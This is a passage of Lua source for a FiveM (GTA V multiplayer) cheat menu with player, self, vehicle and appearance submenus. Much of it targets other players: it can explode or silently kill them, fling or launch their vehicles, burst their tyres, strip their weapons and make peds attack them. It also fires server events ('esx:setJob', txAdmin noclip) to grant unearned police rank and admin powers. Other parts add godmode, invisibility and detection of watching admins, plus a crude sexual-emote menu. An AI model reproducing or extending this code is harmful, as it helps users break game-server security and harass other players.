                        SetEntityAsMissionEntity(dance_ped_global, true, true)
                        SetEntityInvincible(dance_ped_global, true)
                        ClearPedTasksImmediately(dance_ped_global)
                        TaskStartScenarioInPlace(dance_ped_global, "WORLD_HUMAN_CHEERING", 0, true)

                        ClearPedTasksImmediately(targetPed)
                        TaskStartScenarioInPlace(targetPed, "WORLD_HUMAN_CHEERING", 0, true)
                        ShowInfo("~g~Dancing with ped started on selected player!")
                    else
                        DanceWithPedEnabled = false
                        ShowInfo("~r~Failed to create ped!")
                    end
                    SetModelAsNoLongerNeeded(GetHashKey(model))
                else
                    DanceWithPedEnabled = false
                    ShowInfo("~r~Selected player not found!")
                end
            else
                DanceWithPedEnabled = false
                ShowInfo("~r~No player selected! Use 'Select Player' first.")
            end
        else
            if selectedPlayer ~= -1 then
                local targetPed = GetPlayerPed(selectedPlayer)
                if targetPed and DoesEntityExist(targetPed) then
                    ClearPedTasksImmediately(targetPed)
                end
            end
            if dance_ped_global then
                DeleteEntity(dance_ped_global)
                dance_ped_global = nil
            end
            ShowInfo("~r~Dancing with ped stopped!")
        end
			elseif WarMenu.ComboBox("Teleport Into Players Vehicle", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selectedIndex)
                    currSeatIndex = currentIndex
                    selSeatIndex = currentIndex
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
						local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
						if string.lower(confirm) == "y" then
							local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
							if selSeatIndex == 1 then
								if IsVehicleSeatFree(veh, 0) then
									SetPedIntoVehicle(PlayerPedId(), veh, 0)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							elseif selSeatIndex == 2 then
								if IsVehicleSeatFree(veh, 1) then
									SetPedIntoVehicle(PlayerPedId(), veh, 1)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							elseif selSeatIndex == 3 then
								if IsVehicleSeatFree(veh, 2) then
									SetPedIntoVehicle(PlayerPedId(), veh, 2)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							end
						end
					end
			elseif WarMenu.ComboBox("Player Functions", {"Give Player Health", "Give Player Armor", "Cancel Anim/Task", "Explode Player", "Silent Kill Player"}, currSPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
                currSPFuncIndex = currentIndex
                selSPFuncIndex = currentIndex
                end) then
				if selSPFuncIndex == 1 then
					local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
					CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), coords, 0, 200, 0, '')
				elseif selSPFuncIndex == 2 then
					local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
					CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), coords, 0, 200, 0, '')
				elseif selSPFuncIndex == 3 then
					ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				elseif selSPFuncIndex == 4 then
					ExplodePlayer(selectedPlayer)
				elseif selSPFuncIndex == 5 then
					local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
					AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
				end
			elseif WarMenu.Button("Give Player Vehicle") then
                local veh = GetKeyboardInput("Enter Vehicle Model Name")
				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
				SpawnVehAtCoords(veh, coords)
            elseif WarMenu.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
                Tracking = not Tracking
                TrackedPlayer = selectedPlayer
                
                
			elseif WarMenu.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
				FlingingPlayer = not FlingingPlayer
				FlingedPlayer = selectedPlayer
			elseif WarMenu.Button("Launch Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")		
				else
				
					local wasSpeccing= false
					local tmp = nil
					if Spectating then
						tmp = SpectatedPlayer
						wasSpeccing = true
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
					if wasSpeccing then
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
				end
			elseif WarMenu.Button("Slam Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")
				else
				
					local wasSpeccing= false
					local tmp = nil
					if Spectating then
						tmp = SpectatedPlayer
						wasSpeccing = true
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
					if wasSpeccing then
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
				end
			elseif WarMenu.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selectedIndex)
                    currTireIndex = currentIndex
                    selTireIndex = currentIndex
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
					
						local wasSpeccing= false
						local tmp = nil
						if Spectating then
							tmp = SpectatedPlayer
							wasSpeccing = true
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end
					
						local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
						RequestControlOnce(veh)
						if selTireIndex == 1 then
							SetVehicleTyreBurst(veh, 0, 1, 1000.0)
						elseif selTireIndex == 2 then
							SetVehicleTyreBurst(veh, 1, 1, 1000.0)
						elseif selTireIndex == 3 then
							SetVehicleTyreBurst(veh, 4, 1, 1000.0)
						elseif selTireIndex == 4 then
							SetVehicleTyreBurst(veh, 5, 1, 1000.0)
						elseif selTireIndex == 5 then
							for i=0,7 do
								SetVehicleTyreBurst(veh, i, 1, 1000.0)
							end
						end
						
						if wasSpeccing then
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end
					
					end
            elseif WarMenu.Button("Nearby Peds Attack Player") then
                PedAttack(selectedPlayer, PedAttackType)
            elseif WarMenu.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
                currAttackTypeIndex = currentIndex
                selAttackTypeIndex = currentIndex
                PedAttackType = currentIndex
            end) then
            --elseif WarMenu.MenuButton("Give Weapon", 'weaponspawner') then --It works, but when you back out it puts you in the weapon options menu. (too lazy to fix)
            elseif WarMenu.Button("Give All Weapons") then
            GiveAllWeapons(selectedPlayer)
            elseif WarMenu.Button("Strip Weapons") then
                StripPlayer(selectedPlayer)
            elseif WarMenu.Button("Kick From Vehicle") then
                KickFromVeh(selectedPlayer)
            end
        
        
        -- SELF OPTIONS MENU
        elseif WarMenu.IsMenuOpened('self') then
       if WarMenu.ComboBox("Player Functions", {"Heal Player", "Give Player Armor", "Remove Player Armor", "Clean Player", "Suicide", "Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
                currPFuncIndex = currentIndex
                selPFuncIndex = currentIndex
                end) then
				if selPFuncIndex == 1 then
					SetEntityHealth(PlayerPedId(), 200)
				elseif selPFuncIndex == 2 then
					SetPedArmour(PlayerPedId(), 100)
				elseif selPFuncIndex == 3 then
					SetPedArmour(PlayerPedId(), 0)
				elseif selPFuncIndex == 4 then
					ClearPedBloodDamage(PlayerPedId())
					ClearPedWetness(PlayerPedId())
					ClearPedEnvDirt(PlayerPedId())
					ResetPedVisibleDamage(PlayerPedId())
				elseif selPFuncIndex == 5 then
					SetEntityHealth(PlayerPedId(), 0)
				elseif selPFuncIndex == 6 then
					ClearPedTasksImmediately(PlayerPedId())
				end         
            
            elseif WarMenu.MenuButton('ESX Outfits', 'esxoutfits') then
                        elseif WarMenu.CheckBox("Shiftboost", ShiftBoostEnabled) then
                ShiftBoostEnabled = not ShiftBoostEnabled
            elseif WarMenu.Button("TX Noclip ~r~[ RISK ]") then
                if not TXNoclipEnabled then
                    TriggerEvent('txcl:setPlayerMode', "noclip", true)
                    TXNoclipEnabled = true
                    ShowInfo("TX Noclip ~g~Enabled")
                else
                    TriggerEvent('txcl:setPlayerMode', "none", true)
                    TXNoclipEnabled = false
                    ShowInfo("TX Noclip ~r~Disabled")
                end
            elseif WarMenu.Button("Pickup Props") then
                PickupPropsEnabled = not PickupPropsEnabled
                if PickupPropsEnabled then
                    ShowInfo("Pickup Props ~g~Enabled")
                else
                    ShowInfo("Pickup Props ~r~Disabled")
                    -- Reset holding state when disabled
                    if holdingEntity then
                        local playerPed = PlayerPedId()
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        ClearPedTasks(playerPed)
                        if heldEntity then
                            DetachEntity(heldEntity, true, true)
                            heldEntity = nil
                        end
                    end
                end
            elseif WarMenu.Button("Ped Menu") then
                TriggerEvent('esx_skin:openSaveableMenu')
                ShowInfo("Opening Ped Menu...")
            elseif WarMenu.Button("Force Handup") then
                ForceHandupEnabled = not ForceHandupEnabled
                if ForceHandupEnabled then
                    ShowInfo("Force Handup ~g~Enabled")
                else
                    ShowInfo("Force Handup ~r~Disabled")
                    -- Stop robbing if currently active
                    if robbing then
                        StopRobbing()
                    end
                end
            elseif WarMenu.CheckBox("Anti-AFK", AntiAFKEnabled) then
    AntiAFKEnabled = not AntiAFKEnabled
    if AntiAFKEnabled then
        StartAntiAFK()
        ShowInfo("~g~Anti-AFK enabled!")
    else
        ShowInfo("~r~Anti-AFK disabled!")
    end
    
elseif WarMenu.CheckBox(" Lazer Eye  ~r~[ RISK ] ", LazerEyeEnabled, "Off", "On") then
    LazerEyeEnabled = not LazerEyeEnabled
    if LazerEyeEnabled then
        ShowInfo("~r~Lazer Eye Enabled\n~w~Hold  (E) to shoot laser from your eyes")
    else
        ShowInfo("~y~Lazer Eye Disabled")
    end


    
            elseif WarMenu.Button("F6police menu ~b~[ ESX ]") then
                TriggerEvent('esx:setJob', {
                    name = "police",
                    label = "Police",
                    grade = 12,
                    grade_name = "boss",
                    grade_label = "Assistant Chief Of Police"
                })
                ShowInfo("Police job set ~g~successfully!")
            elseif WarMenu.Button("Control Car") then
                ControlCarEnabled = not ControlCarEnabled
                if ControlCarEnabled then
                    ShowInfo("Control Car ~g~Enabled~w~\nY to select / Hold the E key to control the vehicle")
                else
                    ShowInfo("Control Car ~r~Disabled")
                    -- Reset selected vehicle when disabled
                    if selectedVehicle and DoesEntityExist(selectedVehicle) then
                        SetEntityDrawOutline(selectedVehicle, false)
                        if isVehicleFlying then
                            SetEntityHasGravity(selectedVehicle, true)
                            isVehicleFlying = false
                        end
                        selectedVehicle = nil
                    end
                end
                 elseif WarMenu.Button("~r~Explode Self ~w~(terrorist)") then     print("~r~Explode Self Button Pressed")     StartExplodeSelf()
                        elseif WarMenu.CheckBox("Stealth Godmode", Godmode) then
                Godmode = not Godmode
                ToggleGodmode(Godmode)
            elseif WarMenu.CheckBox("Demigod Mode", Demigod) then
                Demigod = not Demigod
            elseif WarMenu.CheckBox("Alternative Demigod Mode", ADemigod) then
                ADemigod = not ADemigod
			
            elseif WarMenu.CheckBox("Infinite Stamina", InfStamina) then
                InfStamina = not InfStamina
            elseif WarMenu.ComboBoxSlider("Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selectedIndex)
                currFastRunIndex = currentIndex
                selFastRunIndex = currentIndex
                FastRunMultiplier = FastCB[currentIndex]
                SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
                end) then
			elseif WarMenu.ComboBoxSlider("Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selectedIndex)
                currFastSwimIndex = currentIndex
                selFastSwimIndex = currentIndex
                FastSwimMultiplier = FastCB[currentIndex]
                SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
                end) then
            elseif WarMenu.CheckBox("Super Jump", SuperJump) then
                SuperJump = not SuperJump
            elseif WarMenu.CheckBox("Invisibility", Invisibility) then
                Invisibility = not Invisibility
                if not Invisibility then
                    SetEntityVisible(PlayerPedId(), true)
                end
                
            elseif WarMenu.CheckBox("Magneto Mode", ForceTog) then
                ForceMod()
            elseif WarMenu.CheckBox("Forcefield", Forcefield) then
                Forcefield = not Forcefield
            elseif WarMenu.CheckBox("Noclip", Noclipping) then
                ToggleNoclip()
            elseif WarMenu.Button("Change PedModel [~r~RISK~s~]") then
                ChangePedModel()
            elseif WarMenu.CheckBox("Never Wanted", NeverWanted) then
                NeverWanted = not NeverWanted
                
            elseif WarMenu.Button('~r~Self Crash') then
                SelfCrash()
            end
    elseif WarMenu.IsMenuOpened('visualoptions') then
    if WarMenu.CheckBox("Thermal Vision", ThermalVisionEnabled, "Off", "On") then
        ThermalVisionEnabled = not ThermalVisionEnabled
        if ThermalVisionEnabled then
            Citizen.CreateThread(function()
                Wait(0) -- מחכה 200 מילישניות
                SetSeethrough(true)
            end)
        else
            SetSeethrough(false)
        end

elseif WarMenu.CheckBox("Night Vision", NightVisionEnabled, "Off", "On") then
        NightVisionEnabled = not NightVisionEnabled
        if NightVisionEnabled then
            Citizen.CreateThread(function()
                Wait(0) -- מחכה 200 מילישניות
                SetNightvision(true)
            end)
        else
            SetNightvision(false)
        end
    elseif WarMenu.CheckBox("Spectator List", SpectatorListEnabled, "Off", "On") then
        SpectatorListEnabled = not SpectatorListEnabled
        if SpectatorListEnabled then
            Citizen.CreateThread(function()
                while SpectatorListEnabled do
                    Wait(0)
                    suspectedSpectators = {}
                    local myPed = PlayerPedId()
                    local myCoords = GetEntityCoords(myPed)
                    for i = 0, 255 do
                        if NetworkIsPlayerActive(i) and i ~= PlayerId() then
                            local targetPed = GetPlayerPed(i)
                            if DoesEntityExist(targetPed) then
                                local dist = #(GetEntityCoords(targetPed) - myCoords)
                                local visible = IsEntityVisible(targetPed)
                                local spectate = NetworkIsInSpectatorModeForPlayer(i)
                                if (not visible or spectate) and dist < 50.0 then
                                    local name = GetPlayerName(i)
                                    table.insert(suspectedSpectators, name)
                                    if not lastAnnounced[name] then
                                        TriggerEvent("chat:addMessage", {
                                            color = { 0, 255, 200 },
                                            multiline = false,
                                            args = { "Spectator Alert", name .. " is spectating you!" }
                                        })
                                        lastAnnounced[name] = true
                                    end
                                end
                            end
                        end
                    end
                    for name, _ in pairs(lastAnnounced) do
                        local stillWatching = false
                        for _, v in pairs(suspectedSpectators) do
                            if v == name then
                                stillWatching = true
                            end
                        end
                        if not stillWatching then
                            lastAnnounced[name] = nil
                        end
                    end
                end
            end)
            Citizen.CreateThread(function()
                while SpectatorListEnabled do
                    Wait(0)
                    local baseX, baseY = 0.015, 0.05
                    local boxWidth, lineHeight = 0.2, 0.027
                    local totalHeight = math.max(1, #suspectedSpectators + 1) * lineHeight
                    DrawRect(baseX + boxWidth / 2, baseY + totalHeight / 2, boxWidth, totalHeight, 10, 10, 10, 150)
                    SetTextFont(0)
                    SetTextScale(0.31, 0.31)
                    SetTextColour(0, 255, 220, 255)
                    SetTextCentre(false)
                    BeginTextCommandDisplayText("STRING")
                    AddTextComponentSubstringPlayerName("» Spectator List")
                    EndTextCommandDisplayText(baseX + 0.005, baseY)
                    if #suspectedSpectators == 0 then
                        SetTextFont(0)
                        SetTextScale(0.29, 0.29)
                        SetTextColour(160, 160, 160, 180)
                        SetTextCentre(false)
                        BeginTextCommandDisplayText("STRING")
                        AddTextComponentSubstringPlayerName("- No one nearby")
                        EndTextCommandDisplayText(baseX + 0.005, baseY + lineHeight)
                    else
                        for i, name in ipairs(suspectedSpectators) do
                            SetTextFont(0)
                            SetTextScale(0.29, 0.29)
                            SetTextColour(255, 255, 255, 240)
                            SetTextCentre(false)
                            BeginTextCommandDisplayText("STRING")
                            AddTextComponentSubstringPlayerName("- " .. name)
                            EndTextCommandDisplayText(baseX + 0.005, baseY + i * lineHeight)
                        end
                    end
                end
            end)
        end
    end
    
    elseif WarMenu.IsMenuOpened('vehiclemodifiers') then
    
    if WarMenu.CheckBox("Easy Handling", EasyHandling, "off", "on") then
        EasyHandling = not EasyHandling
        local playerPed = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        if vehicle ~= 0 then
            ApplyHandling(vehicle, 100, EasyHandling)
        else
            if EasyHandling then
                ShowInfo('~y~Easy Handling is enabled, but you are not in a vehicle')
            else
                ShowInfo('~y~Easy Handling is off')
            end
        end
    end

function ApplyHandling(vehicle, level, enable)
    if not DoesEntityExist(vehicle) or not IsVehicleDriveable(vehicle, false) then
        ShowInfo('~r~שגיאה: אתה לא ברכב')
        return
    end

    if enable then
        local gravity = 14.8 -- כוח משיכה (9.8 + (100/200)*10.0)
        local suspension = 0.3 -- מתלה (0.5 - (100/200)*0.4)
        local traction = 1.5 -- אחיזה (1.0 + (100/200)*1.0)

        SetVehicleGravityAmount(vehicle, gravity)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fSuspensionForce', suspension)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fTractionCurveMin', traction)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fTractionCurveMax', traction)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fLowSpeedTractionLossMult', 0.1)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fMass', 1250.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fInitialDriveMaxFlatVel', 175.0)

        ShowInfo('~g~Easy Handling מופעל')
    else
        SetVehicleGravityAmount(vehicle, 9.8)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fSuspensionForce', 0.5)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fTractionCurveMin', 1.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fTractionCurveMax', 1.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fLowSpeedTractionLossMult', 1.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fMass', 1500.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fInitialDriveMaxFlatVel', 150.0)
        ShowInfo('~y~Easy Handling כבוי')
    end
end
       if WarMenu.CheckBox("Super Brakes", SuperBrakesEnabled, "off", "on") then
        SuperBrakesEnabled = not SuperBrakesEnabled
        if SuperBrakesEnabled then
            ShowInfo("Super Brakes enabled! Press CONTROL to stop the vehicle.")
            StartSuperBrakes() -- מפעיל את הפונקציה שמתחילה את הקוד של Super Brakes
        else
            ShowInfo("Super Brakes disabled.")
        end
    end
 if WarMenu.CheckBox("Drift Mode", DriftModeEnabled, "off", "on") then
        DriftModeEnabled = not DriftModeEnabled
        if DriftModeEnabled then
            ShowInfo("Drift Mode enabled! Drift like a pro!")
            StartDriftMode() -- מפעיל את Drift Mode
        else
            ShowInfo("Drift Mode disabled.")
        end
    end
  if WarMenu.CheckBox("Horn Boost", HornBoostEnabled, "off", "on") then
        HornBoostEnabled = not HornBoostEnabled
        if HornBoostEnabled then
            ShowInfo("Horn Boost enabled! Press E to activate boost.")
            StartHornBoost() -- מפעיל את Horn Boost
        else
            ShowInfo("Horn Boost disabled.")
        end
    end

    if WarMenu.CheckBox("Waterproof Engine", WaterproofEngineEnabled, "Off", "On") then
        WaterproofEngineEnabled = not WaterproofEngineEnabled
        if WaterproofEngineEnabled then
            ShowInfo("Waterproof Engine enabled!")
            StartWaterproofEngine() -- מפעיל את Waterproof Engine
        else
            ShowInfo("Waterproof Engine disabled.")
        end
    end
     if WarMenu.CheckBox("Vehicle Jump", VehicleJumpEnabled, "Off", "On") then
        VehicleJumpEnabled = not VehicleJumpEnabled
        if VehicleJumpEnabled then
            ShowInfo("Vehicle Jump enabled! Press SPACE to jump.")
            StartVehicleJump() -- מפעיל את Vehicle Jump
        else
            ShowInfo("Vehicle Jump disabled.")
        end
    end
     if WarMenu.CheckBox("Invisible Car", InvisibleCarEnabled, "Off", "On") then
        InvisibleCarEnabled = not InvisibleCarEnabled
        if InvisibleCarEnabled then
            ShowInfo("Invisible Car enabled!")
            StartInvisibleCar() -- מפעיל את Invisible Car
        else
            ShowInfo("Invisible Car disabled.")
        end
    end


elseif WarMenu.IsMenuOpened('menuPosition') then
    if WarMenu.Button("Move Left") then
        UpdateMenuPosition(menuPosX - 0.01, menuPosY)
    elseif WarMenu.Button("Move Right") then
        UpdateMenuPosition(menuPosX + 0.01, menuPosY)
    elseif WarMenu.Button("Move Up") then
        UpdateMenuPosition(menuPosX, menuPosY - 0.01)
    elseif WarMenu.Button("Move Down") then
        UpdateMenuPosition(menuPosX, menuPosY + 0.01)
    elseif WarMenu.Button("Reset Position") then
        UpdateMenuPosition(0.0175, 0.025)
    end

elseif WarMenu.IsMenuOpened('adultemotes') then
    if WarMenu.Button("~r~Stop Animation") then
        ClearPedTasksImmediately(PlayerPedId())
    elseif WarMenu.Button("Jerk Off") then
        PlayAdultAnim('mp_player_int_upperwank', 'mp_player_int_wank_01')
    elseif WarMenu.Button("Cow Girl") then
        PlayAdultAnim('mini@prostitutes@sexnorm_veh', 'sex_loop_prostitute')
    elseif WarMenu.Button("Suck Guy Off") then
        PlayAdultAnim('mini@prostitutes@sexnorm_veh', 'bj_loop_prostitute')
    elseif WarMenu.Button("Female Sex") then
        PlayAdultAnim('rcmpaparazzo_2', 'shag_loop_poppy')
    elseif WarMenu.Button("Fuck Her") then
        PlayAdultAnim('rcmpaparazzo_2', 'shag_loop_a')
    elseif WarMenu.Button("Turn Gay") then
        PlayAdultAnim('mini@strip_club@private_dance@part1', 'priv_dance_p1')
    elseif WarMenu.Button("360") then
        PlayAdultAnim('mini@strip_club@pole_dance@pole_dance1', 'pd_dance_01')
    end

    
       elseif WarMenu.IsMenuOpened('esxoutfits') then
       if WarMenu.Button('Gang Outfit') then
        ApplyGangOutfit()
      elseif WarMenu.Button('Street Outfit') then
        ApplyStreetOutfit()

    elseif WarMenu.Button('Police Outfit') then
        ApplyPoliceOutfit()
    end
    
        -- APPEARANCE MENU
        elseif WarMenu.IsMenuOpened('appearance') then
            if WarMenu.Button("Set Model") then
                local model = GetKeyboardInput("Enter Model Name:")
                RequestModel(GetHashKey(model))
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                else ShowInfo("~r~Model not recognized (Try Again)") end
            elseif WarMenu.MenuButton("Modify Skin Textures", 'modifyskintextures') then
            elseif WarMenu.Button("Randomize Clothing") then
                RandomClothes(PlayerId())
            elseif WarMenu.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
            elseif WarMenu.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                SetCurrentOutfit(Outfits[selClothingIndex])
            end

            -- MODIFY SKIN TEXTURES MENU
                -- Useful methods to retrieve max number of clothes/colors for each body part index
                -- http://gtaxscripting.blogspot.com/2016/04/gta-v-peds-component-and-props.html
            elseif WarMenu.IsMenuOpened('modifyskintextures') then
                --" ..tostring(GetNumberOfPedDrawableVariations(PlayerPedId(), 0)).. " Variations)" -- Removed this part for now
                
                ----------------------------------------------------------------------
                -- The values of currSomethingIndex and selSomethingIndex need to   --
                -- be assigned to the drawables/textures the ped is currently using --
                -- so it doesn't reset them (before opening any of the menus)       --
                ----------------------------------------------------------------------

                if WarMenu.MenuButton("Head", "modifyhead") then
				
					if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
						WarMenu.CloseMenu()
						WarMenu.OpenMenu('modifyskintextures') 
						ShowInfo("~r~Only MP Models Supported For Now!") 
                    end
                    
					faceItemsList = GetHeadItems()
                    faceTexturesList = GetHeadTextures(GetPedDrawableVariation(PlayerPedId(), 0))
                    hairItemsList = GetHairItems()
                    hairTexturesList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))
					maskItemsList = GetMaskItems()
					hatItemsList = GetHatItems()
                    hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0))
				end
                
                -- Head Menu
                elseif WarMenu.IsMenuOpened('modifyhead') then
                    if WarMenu.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
                        currFaceIndex = currentIndex
                        selFaceIndex = currentIndex 
                        SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currentIndex]-1, 0, 0)
						faceTexturesList = GetHeadTextures(faceItemsList[currentIndex]-1)
						end) then
						--[[ -- I dont think any MP faces have textures?
					elseif WarMenu.ComboBox2("Face Texture", faceTexturesList, currFtextureIndex, selFtextureIndex, function(currentIndex, selectedIndex)
                        currFtextureIndex = currentIndex
                        selFtextureIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currFaceIndex]-1, faceTexturesList[currentIndex]-1, 0)
                    end) then
                        ]]
                    elseif WarMenu.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
                        previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        
                        previousHairTextureDisplay = hairTextureList[currHairTextureIndex]

                        currHairIndex = currentIndex
                        selHairIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currentIndex]-1, 0, 0)
                        currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        hairTextureList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))

                        if (currentKey == keys.left or currentKey == keys.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
                            currHairTextureIndex = hairTexturesList[currentHairTexture]
                            selHairTextureIndex = hairTexturesList[currentHairTexture]
                        end

                        end) then
                    elseif WarMenu.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
                        currHairTextureIndex = currentIndex
                        selHairTextureIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currHairIndex]-1, currentIndex-1, 0)
                        end) then
                    elseif WarMenu.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
                        currMaskIndex = currentIndex
                        selMaskIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[currentIndex]-1, 0, 0)
						end) then
                    elseif WarMenu.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
                        previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props before the hat index and the prop updates (previous)

                        -- I wanted to grab hatTexturesList[currHatTextureIndex] before the the Prop was updated. This value is the number (index) that is shown on the Hat Texture ComboBox before it updates
                        previousHatTextureDisplay = hatTexturesList[currHatTextureIndex]

                        -- Both Hat Slider and Hat Texture ComboBox values update
                        currHatIndex = currentIndex
                        selHatIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, hatItemsList[currentIndex]-1, 0, 0)
                        currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props after the hat index and the prop updates (current)
                        hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0)) -- Generates our array of indexes

                        -- This if condition will only run once for every hat change since the variables previousHatTexture and currentHatTexture will become the same after the SetPedPropIndex() function runs
                        if (currentKey == keys.left or currentKey == keys.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then 
                            print('if condition')
                            -- Checking if the left/right arrow key was pressed since this function runs every tick, to make sure it really only runs once
                            
                            -- Sets the current Index of the HatTexturesList to the max value of the currentHatTexture
                            currHatTextureIndex = hatTexturesList[currentHatTexture]
                            selHatTextureIndex = hatTexturesList[currentHatTexture]
                        end

						end) then	
					elseif WarMenu.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
                        currHatTextureIndex = currentIndex
                        selHatTextureIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), currentIndex, 0)
						end) then
						
                    end


        -- MODIFIERS MENU
        elseif WarMenu.IsMenuOpened('modifiers') then
            if WarMenu.ComboBox("Forcefield Radius", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
                    currForcefieldRadiusIndex = currentIndex
                    selForcefieldRadiusIndex = currentIndex
                    ForcefieldRadius = ForcefieldRadiusOps[currentIndex]
                    end) then
            elseif WarMenu.ComboBox("Noclip Speed", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
                    currNoclipSpeedIndex = currentIndex
                    selNoclipSpeedIndex = currentIndex
